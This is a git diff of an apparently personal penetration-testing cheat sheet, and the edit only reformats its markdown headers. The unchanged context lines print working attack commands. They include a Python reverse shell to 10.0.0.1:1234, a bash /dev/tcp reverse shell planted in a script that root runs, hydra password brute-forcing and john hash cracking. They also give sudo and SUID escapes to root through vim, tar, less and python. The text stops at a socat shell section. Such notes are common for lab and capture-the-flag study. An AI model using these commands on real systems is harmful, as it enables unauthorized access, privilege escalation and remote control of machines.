@@ -20,7 +20,7 @@ hydra -l username -P /path/to/wordlist proto://ip
 sh2john.py rsa_file > file.txt
 john file.txt
 
-#Checkin for suid on a system run the following commands
+# Checkin for suid on a system run the following commands
 find / -perm -u=s -type f 2>/dev/null
 
 # Different ways to read a file
@@ -36,40 +36,40 @@ _in python it would be, note that if the machine doesnt have python2 installed(m
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 
-#Privilege scalation with vim
+# Privilege scalation with vim
 
 there are 2 ways of running a shell as root with vim
 
-##_First option_
+## _First option_
 sudo vim 
  -> :set shell=/bin/sh
  -> :shell
 
-##_Second option_
+## _Second option_
 sudo vim -c ':!/bin/sh'
 
 
-#Privilege scalation with tar
+# Privilege scalation with tar
 
 If the user is allowed in the sudoers file we can easily become root by running _sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh_
 
-#Using and understanding netcat
+# Using and understanding netcat
 
 to set up a listening port in nc
 
 nc -lnvp portnumber
 
-#Read pcaps
+# Read pcaps
 
 Could use wireshark
 
 If you are looking for a password strings will just do the job for it and it will provide more clarity
 
-#Bash remote shell
+# Bash remote shell
 
 echo 'bash -c "bash -i >& /dev/tcp/ip/port 0>&1"' > /path/to/script run by root
 
-#Privesc with less
+# Privesc with less
 you can run less with _sudo_ against a file and enter in less's command mode by typing !/bin/sh
 
 Example
@@ -77,20 +77,20 @@ Example
 sudo less file.log
 !/bin/sh
 
-#GTFOs bin with python
+# GTFOs bin with python
 
 In order to get a privileged shell with python (only if it has the suid set) we can run
 
 python -c 'import os; os.system("/bin/sh")'
 
-#Stable shell with pty
+# Stable shell with pty
 
 When we stabblish the first shell with nc it tends not to have a pty which for some porcesses it can be stressful
 
 to solve that you can run this python adhoc command python -c 'import pty; pty.spawn("/bin/bash")' which gets you a tty that lets you freely run all the commands you need without prompting any error nor warning about not having a tty
 
 
-#Socat GTFO bin
+# Socat GTFO bin
 
 To get a remote shell on a machine using socat you need to run this
 this is run on your local machine
